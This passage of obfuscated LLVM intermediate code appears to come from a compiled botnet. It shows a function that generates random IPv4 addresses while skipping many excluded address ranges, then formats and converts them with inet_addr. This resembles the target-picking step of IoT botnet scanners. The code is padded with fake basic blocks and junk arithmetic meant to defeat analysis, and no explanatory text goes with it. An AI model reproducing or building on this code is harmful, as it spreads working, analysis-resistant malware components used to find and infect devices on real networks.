  %5569 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5570 = zext i8 %5569 to i32
  %5571 = icmp eq i32 %5570, 237
  br label %originalBB357

originalBB361alteredBB:                           ; preds = %originalBB361, %2698
  %5572 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5573 = zext i8 %5572 to i32
  %5574 = icmp eq i32 %5573, 92
  br label %originalBB361

originalBB365alteredBB:                           ; preds = %originalBB365, %2718
  %5575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5576 = zext i8 %5575 to i32
  %5577 = icmp sge i32 %5576, 220
  br label %originalBB365

originalBB369alteredBB:                           ; preds = %originalBB369, %2738
  %5578 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5579 = zext i8 %5578 to i32
  %5580 = icmp slt i32 %5579, 223
  br label %originalBB369

originalBB373alteredBB:                           ; preds = %originalBB373, %2762
  %5581 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5582 = zext i8 %5581 to i32
  %5583 = icmp eq i32 %5582, 238
  br label %originalBB373

originalBB377alteredBB:                           ; preds = %originalBB377, %2790
  %5584 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5585 = zext i8 %5584 to i32
  %5586 = icmp eq i32 %5585, 209
  br label %originalBB377

originalBB381alteredBB:                           ; preds = %originalBB381, %2818
  %5587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5588 = zext i8 %5587 to i32
  %5589 = icmp slt i32 %5588, 31
  br label %originalBB381

originalBB385alteredBB:                           ; preds = %originalBB385, %2838
  %5590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5591 = zext i8 %5590 to i32
  %5592 = icmp eq i32 %5591, 208
  br label %originalBB385

originalBB389alteredBB:                           ; preds = %originalBB389, %2878
  %5593 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5594 = zext i8 %5593 to i32
  %5595 = icmp sge i32 %5594, 128
  br label %originalBB389

originalBB393alteredBB:                           ; preds = %originalBB393, %2906
  %5596 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5597 = zext i8 %5596 to i32
  %5598 = icmp eq i32 %5597, 63
  br label %originalBB393

originalBB397alteredBB:                           ; preds = %originalBB397, %2962
  %5599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5600 = zext i8 %5599 to i32
  %5601 = icmp eq i32 %5600, 76
  br label %originalBB397

originalBB401alteredBB:                           ; preds = %originalBB401, %2982
  %5602 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5603 = zext i8 %5602 to i32
  %5604 = icmp eq i32 %5603, 185
  br label %originalBB401

originalBB405alteredBB:                           ; preds = %originalBB405, %3006
  %5605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5606 = zext i8 %5605 to i32
  %5607 = icmp sge i32 %5606, 144
  br label %originalBB405

originalBB409alteredBB:                           ; preds = %originalBB409, %3030
  %5608 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5609 = zext i8 %5608 to i32
  %5610 = icmp eq i32 %5609, 185
  br label %originalBB409

originalBB413alteredBB:                           ; preds = %originalBB413, %3054
  %5611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5612 = zext i8 %5611 to i32
  %5613 = icmp sge i32 %5612, 21
  br label %originalBB413

originalBB417alteredBB:                           ; preds = %originalBB417, %3090
  %5614 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5615 = zext i8 %5614 to i32
  %5616 = icmp slt i32 %5615, 139
  br label %originalBB417

originalBB421alteredBB:                           ; preds = %originalBB421, %3110
  %5617 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5618 = zext i8 %5617 to i32
  %5619 = icmp eq i32 %5618, 185
  br label %originalBB421

originalBB425alteredBB:                           ; preds = %originalBB425, %3138
  %5620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5621 = zext i8 %5620 to i32
  %5622 = icmp slt i32 %5621, 191
  br label %originalBB425

originalBB429alteredBB:                           ; preds = %originalBB429, %3162
  %5623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5624 = zext i8 %5623 to i32
  %5625 = icmp eq i32 %5624, 150
  br label %originalBB429

originalBB433alteredBB:                           ; preds = %originalBB433, %3190
  %5626 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5627 = zext i8 %5626 to i32
  %5628 = icmp eq i32 %5627, 66
  br label %originalBB433

originalBB437alteredBB:                           ; preds = %originalBB437, %3218
  %5629 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5630 = zext i8 %5629 to i32
  %5631 = icmp slt i32 %5630, 139
  br label %originalBB437

originalBB441alteredBB:                           ; preds = %originalBB441, %3242
  %5632 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5633 = zext i8 %5632 to i32
  %5634 = icmp eq i32 %5633, 94
  br label %originalBB441

originalBB445alteredBB:                           ; preds = %originalBB445, %3262
  %5635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5636 = zext i8 %5635 to i32
  %5637 = icmp sge i32 %5636, 237
  br label %originalBB445

originalBB449alteredBB:                           ; preds = %originalBB449, %3282
  %5638 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5639 = zext i8 %5638 to i32
  %5640 = icmp slt i32 %5639, 255
  br label %originalBB449

originalBB453alteredBB:                           ; preds = %originalBB453, %3302
  %5641 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5642 = zext i8 %5641 to i32
  %5643 = icmp eq i32 %5642, 63
  br label %originalBB453

originalBB457alteredBB:                           ; preds = %originalBB457, %3322
  %5644 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5645 = zext i8 %5644 to i32
  %5646 = icmp eq i32 %5645, 251
  br label %originalBB457

originalBB461alteredBB:                           ; preds = %originalBB461, %3342
  %5647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5648 = zext i8 %5647 to i32
  %5649 = icmp sge i32 %5648, 19
  br label %originalBB461

originalBB465alteredBB:                           ; preds = %originalBB465, %3386
  %5650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5651 = zext i8 %5650 to i32
  %5652 = icmp eq i32 %5651, 91
  br label %originalBB465

originalBB469alteredBB:                           ; preds = %originalBB469, %3410
  %5653 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5654 = zext i8 %5653 to i32
  %5655 = icmp slt i32 %5654, 115
  br label %originalBB469

originalBB473alteredBB:                           ; preds = %originalBB473, %3450
  %5656 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5657 = zext i8 %5656 to i32
  %5658 = icmp eq i32 %5657, 209
  br label %originalBB473

originalBB477alteredBB:                           ; preds = %originalBB477, %3478
  %5659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5660 = zext i8 %5659 to i32
  %5661 = icmp eq i32 %5660, 188
  br label %originalBB477

originalBB481alteredBB:                           ; preds = %originalBB481, %3498
  %5662 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5663 = zext i8 %5662 to i32
  %5664 = icmp eq i32 %5663, 165
  br label %originalBB481

originalBB485alteredBB:                           ; preds = %originalBB485, %3530
  %5665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5666 = zext i8 %5665 to i32
  %5667 = icmp eq i32 %5666, 80
  br label %originalBB485

originalBB489alteredBB:                           ; preds = %originalBB489, %3582
  %5668 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5669 = zext i8 %5668 to i32
  %5670 = icmp eq i32 %5669, 178
  br label %originalBB489

originalBB493alteredBB:                           ; preds = %originalBB493, %3622
  %5671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5672 = zext i8 %5671 to i32
  %5673 = icmp eq i32 %5672, 46
  br label %originalBB493

originalBB497alteredBB:                           ; preds = %originalBB497, %3642
  %5674 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5675 = zext i8 %5674 to i32
  %5676 = icmp eq i32 %5675, 105
  br label %originalBB497

originalBB501alteredBB:                           ; preds = %originalBB501, %3666
  %5677 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5678 = zext i8 %5677 to i32
  %5679 = icmp eq i32 %5678, 254
  br label %originalBB501

originalBB505alteredBB:                           ; preds = %originalBB505, %3686
  %5680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5681 = zext i8 %5680 to i32
  %5682 = icmp eq i32 %5681, 51
  br label %originalBB505

originalBB509alteredBB:                           ; preds = %originalBB509, %3718
  %5683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5684 = zext i8 %5683 to i32
  %5685 = icmp eq i32 %5684, 5
  br label %originalBB509

originalBB513alteredBB:                           ; preds = %originalBB513, %3738
  %5686 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5687 = zext i8 %5686 to i32
  %5688 = icmp eq i32 %5687, 196
  br label %originalBB513

originalBB517alteredBB:                           ; preds = %originalBB517, %3766
  %5689 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5690 = zext i8 %5689 to i32
  %5691 = icmp eq i32 %5690, 91
  br label %originalBB517

originalBB521alteredBB:                           ; preds = %originalBB521, %3798
  %5692 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5693 = zext i8 %5692 to i32
  %5694 = icmp sge i32 %5693, 128
  br label %originalBB521

originalBB525alteredBB:                           ; preds = %originalBB525, %3818
  %5695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5696 = zext i8 %5695 to i32
  %5697 = icmp slt i32 %5696, 159
  br label %originalBB525

originalBB529alteredBB:                           ; preds = %originalBB529, %3838
  %5698 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5699 = zext i8 %5698 to i32
  %5700 = icmp eq i32 %5699, 107
  br label %originalBB529

originalBB533alteredBB:                           ; preds = %originalBB533, %3862
  %5701 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5702 = zext i8 %5701 to i32
  %5703 = icmp sge i32 %5702, 96
  br label %originalBB533

originalBB537alteredBB:                           ; preds = %originalBB537, %3882
  %5704 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5705 = zext i8 %5704 to i32
  %5706 = icmp slt i32 %5705, 111
  br label %originalBB537

originalBB541alteredBB:                           ; preds = %originalBB541, %3910
  %5707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5708 = zext i8 %5707 to i32
  %5709 = icmp sge i32 %5708, 160
  br label %originalBB541

originalBB545alteredBB:                           ; preds = %originalBB545, %3942
  %5710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5711 = zext i8 %5710 to i32
  %5712 = icmp sge i32 %5711, 64
  br label %originalBB545

originalBB549alteredBB:                           ; preds = %originalBB549, %3978
  %5713 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5714 = zext i8 %5713 to i32
  %5715 = icmp slt i32 %5714, 255
  br label %originalBB549

originalBB553alteredBB:                           ; preds = %originalBB553, %4014
  %5716 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5717 = zext i8 %5716 to i32
  %5718 = icmp eq i32 %5717, 192
  br label %originalBB553

originalBB557alteredBB:                           ; preds = %originalBB557, %4038
  %5719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5720 = zext i8 %5719 to i32
  %5721 = icmp sge i32 %5720, 208
  br label %originalBB557

originalBB561alteredBB:                           ; preds = %originalBB561, %4058
  %5722 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5723 = zext i8 %5722 to i32
  %5724 = icmp slt i32 %5723, 223
  br label %originalBB561

originalBB565alteredBB:                           ; preds = %originalBB565, %4078
  %5725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5726 = zext i8 %5725 to i32
  %5727 = icmp eq i32 %5726, 192
  br label %originalBB565

originalBB569alteredBB:                           ; preds = %originalBB569, %4102
  %5728 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5729 = zext i8 %5728 to i32
  %5730 = icmp sge i32 %5729, 56
  br label %originalBB569

originalBB573alteredBB:                           ; preds = %originalBB573, %4122
  %5731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5732 = zext i8 %5731 to i32
  %5733 = icmp slt i32 %5732, 59
  br label %originalBB573

originalBB577alteredBB:                           ; preds = %originalBB577, %4142
  %5734 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5735 = zext i8 %5734 to i32
  %5736 = icmp eq i32 %5735, 198
  br label %originalBB577

originalBB581alteredBB:                           ; preds = %originalBB581, %4190
  %5737 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5738 = zext i8 %5737 to i32
  %5739 = icmp eq i32 %5738, 199
  br label %originalBB581

originalBB585alteredBB:                           ; preds = %originalBB585, %4242
  %5740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5741 = zext i8 %5740 to i32
  %5742 = icmp eq i32 %5741, 58
  br label %originalBB585

originalBB589alteredBB:                           ; preds = %originalBB589, %4274
  %5743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5744 = zext i8 %5743 to i32
  %5745 = icmp eq i32 %5744, 220
  br label %originalBB589

originalBB593alteredBB:                           ; preds = %originalBB593, %4294
  %5746 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5747 = zext i8 %5746 to i32
  %5748 = icmp sge i32 %5747, 172
  br label %originalBB593

originalBB597alteredBB:                           ; preds = %originalBB597, %4314
  %5749 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5750 = zext i8 %5749 to i32
  %5751 = icmp slt i32 %5750, 175
  br label %originalBB597

originalBB601alteredBB:                           ; preds = %originalBB601, %4350
  %5752 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5753 = zext i8 %5752 to i32
  %5754 = icmp eq i32 %5753, 208
  br label %originalBB601

originalBB605alteredBB:                           ; preds = %originalBB605, %4410
  %5755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5756 = zext i8 %5755 to i32
  %5757 = icmp slt i32 %5756, 223
  br label %originalBB605

originalBB609alteredBB:                           ; preds = %originalBB609, %4442
  %5758 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5759 = zext i8 %5758 to i32
  %5760 = icmp eq i32 %5759, 35
  br label %originalBB609

originalBB613alteredBB:                           ; preds = %originalBB613, %4466
  %5761 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5762 = zext i8 %5761 to i32
  %5763 = icmp slt i32 %5762, 183
  br label %originalBB613

originalBB617alteredBB:                           ; preds = %originalBB617, %4486
  %5764 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5765 = zext i8 %5764 to i32
  %5766 = icmp eq i32 %5765, 52
  br label %originalBB617

originalBB621alteredBB:                           ; preds = %originalBB621, %4526
  %5767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5768 = zext i8 %5767 to i32
  %5769 = icmp eq i32 %5768, 54
  br label %originalBB621

originalBB625alteredBB:                           ; preds = %originalBB625, %4546
  %5770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5771 = zext i8 %5770 to i32
  %5772 = icmp sge i32 %5771, 64
  br label %originalBB625

originalBB629alteredBB:                           ; preds = %originalBB629, %4570
  %5773 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5774 = zext i8 %5773 to i32
  %5775 = icmp eq i32 %5774, 54
  br label %originalBB629

originalBB633alteredBB:                           ; preds = %originalBB633, %4594
  %5776 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5777 = zext i8 %5776 to i32
  %5778 = icmp slt i32 %5777, 255
  br label %originalBB633

originalBB637alteredBB:                           ; preds = %originalBB637, %4614
  %5779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5780 = zext i8 %5779 to i32
  %5781 = icmp eq i32 %5780, 13
  br label %originalBB637

originalBB641alteredBB:                           ; preds = %originalBB641, %4638
  %5782 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5783 = zext i8 %5782 to i32
  %5784 = icmp slt i32 %5783, 60
  br label %originalBB641

originalBB645alteredBB:                           ; preds = %originalBB645, %4666
  %5785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5786 = zext i8 %5785 to i32
  %5787 = icmp slt i32 %5786, 115
  br label %originalBB645

originalBB649alteredBB:                           ; preds = %originalBB649, %4686
  %5788 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5789 = zext i8 %5788 to i32
  %5790 = icmp eq i32 %5789, 163
  br label %originalBB649

originalBB653alteredBB:                           ; preds = %originalBB653, %4718
  %5791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5792 = zext i8 %5791 to i32
  %5793 = icmp slt i32 %5792, 255
  br label %originalBB653

originalBB657alteredBB:                           ; preds = %originalBB657, %4746
  %5794 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5795 = zext i8 %5794 to i32
  %5796 = icmp sge i32 %5795, 128
  br label %originalBB657

originalBB661alteredBB:                           ; preds = %originalBB661, %4774
  %5797 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5798 = zext i8 %5797 to i32
  %5799 = icmp eq i32 %5798, 47
  br label %originalBB661

originalBB665alteredBB:                           ; preds = %originalBB665, %4794
  %5800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5801 = zext i8 %5800 to i32
  %5802 = icmp sge i32 %5801, 224
  br label %originalBB665

originalBB669alteredBB:                           ; preds = %originalBB669, %4822
  %5803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5804 = zext i8 %5803 to i32
  %5805 = icmp eq i32 %5804, 34
  br label %originalBB669

originalBB673alteredBB:                           ; preds = %originalBB673, %4842
  %5806 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5807 = zext i8 %5806 to i32
  %5808 = icmp sge i32 %5807, 96
  br label %originalBB673

originalBB677alteredBB:                           ; preds = %originalBB677, %4866
  %5809 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5810 = zext i8 %5809 to i32
  %5811 = icmp eq i32 %5810, 219
  br label %originalBB677

originalBB681alteredBB:                           ; preds = %originalBB681, %4890
  %5812 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5813 = zext i8 %5812 to i32
  %5814 = icmp slt i32 %5813, 231
  br label %originalBB681

originalBB685alteredBB:                           ; preds = %originalBB685, %4910
  %5815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5816 = zext i8 %5815 to i32
  %5817 = icmp eq i32 %5816, 23
  br label %originalBB685

originalBB689alteredBB:                           ; preds = %originalBB689, %4934
  %5818 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5819 = zext i8 %5818 to i32
  %5820 = icmp slt i32 %5819, 109
  br label %originalBB689

originalBB693alteredBB:                           ; preds = %originalBB693, %4974
  %5821 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5822 = zext i8 %5821 to i32
  %5823 = icmp slt i32 %5822, 189
  br label %originalBB693

originalBB697alteredBB:                           ; preds = %originalBB697, %4994
  %5824 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5825 = zext i8 %5824 to i32
  %5826 = icmp eq i32 %5825, 106
  br label %originalBB697

originalBB701alteredBB:                           ; preds = %originalBB701, %5014
  %5827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5828 = zext i8 %5827 to i32
  %5829 = icmp sge i32 %5828, 184
  br label %originalBB701

originalBB705alteredBB:                           ; preds = %originalBB705, %5042
  %5830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5831 = zext i8 %5830 to i32
  %5832 = icmp eq i32 %5831, 34
  br label %originalBB705

originalBB709alteredBB:                           ; preds = %originalBB709, %5066
  %5833 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5834 = zext i8 %5833 to i32
  %5835 = icmp slt i32 %5834, 255
  br label %originalBB709

originalBB713alteredBB:                           ; preds = %originalBB713, %5122
  %5836 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5837 = zext i8 %5836 to i32
  %5838 = icmp eq i32 %5837, 120
  br label %originalBB713

originalBB717alteredBB:                           ; preds = %originalBB717, %5146
  %5839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5840 = zext i8 %5839 to i32
  %5841 = icmp slt i32 %5840, 108
  br label %originalBB717

originalBB721alteredBB:                           ; preds = %originalBB721, %5170
  %5842 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5843 = zext i8 %5842 to i32
  %5844 = icmp eq i32 %5843, 68
  br label %originalBB721

originalBB725alteredBB:                           ; preds = %originalBB725, %5190
  %5845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5846 = zext i8 %5845 to i32
  %5847 = icmp eq i32 %5846, 78
  br label %originalBB725

originalBB729alteredBB:                           ; preds = %originalBB729, %5210
  %5848 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5849 = zext i8 %5848 to i32
  %5850 = icmp eq i32 %5849, 46
  br label %originalBB729

originalBB733alteredBB:                           ; preds = %originalBB733, %5236
  %5851 = call i32 @rand() #3
  %_734 = sub i32 %5851, 223
  %gen735 = mul i32 %_734, 223
  %_736 = shl i32 %5851, 223
  %_737 = shl i32 %5851, 223
  %_738 = sub i32 %5851, 223
  %gen739 = mul i32 %_738, 223
  %_740 = shl i32 %5851, 223
  %5852 = srem i32 %5851, 223
  %5853 = trunc i32 %5852 to i8
  store i8 %5853, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5854 = call i32 @rand() #3
  %_741 = sub i32 0, %5854
  %gen742 = add i32 %_741, 255
  %_743 = shl i32 %5854, 255
  %_744 = sub i32 0, %5854
  %gen745 = add i32 %_744, 255
  %5855 = srem i32 %5854, 255
  %5856 = trunc i32 %5855 to i8
  store i8 %5856, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5857 = call i32 @rand() #3
  %_746 = sub i32 %5857, 255
  %gen747 = mul i32 %_746, 255
  %_748 = sub i32 0, %5857
  %gen749 = add i32 %_748, 255
  %_750 = shl i32 %5857, 255
  %5858 = srem i32 %5857, 255
  %5859 = trunc i32 %5858 to i8
  store i8 %5859, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5860 = call i32 @rand() #3
  %_751 = sub i32 %5860, 255
  %gen752 = mul i32 %_751, 255
  %_753 = shl i32 %5860, 255
  %_754 = sub i32 %5860, 255
  %gen755 = mul i32 %_754, 255
  %_756 = sub i32 %5860, 255
  %gen757 = mul i32 %_756, 255
  %_758 = sub i32 %5860, 255
  %gen759 = mul i32 %_758, 255
  %_760 = sub i32 %5860, 255
  %gen761 = mul i32 %_760, 255
  %_762 = sub i32 0, %5860
  %gen763 = add i32 %_762, 255
  %_764 = sub i32 %5860, 255
  %gen765 = mul i32 %_764, 255
  %5861 = srem i32 %5860, 255
  %5862 = trunc i32 %5861 to i8
  store i8 %5862, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %originalBB733

originalBB769alteredBB:                           ; preds = %originalBB769, %5265
  %5863 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5863, i8 0, i64 16, i32 16, i1 false)
  %5864 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %5865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5866 = zext i8 %5865 to i32
  %5867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5868 = zext i8 %5867 to i32
  %5869 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5870 = zext i8 %5869 to i32
  %5871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %5872 = zext i8 %5871 to i32
  %5873 = call i32 (i8*, i8*, ...) @szprintf(i8* %5864, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i32 %5866, i32 %5868, i32 %5870, i32 %5872)
  %5874 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %5875 = call i32 @inet_addr(i8* %5874) #3
  br label %originalBB769
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
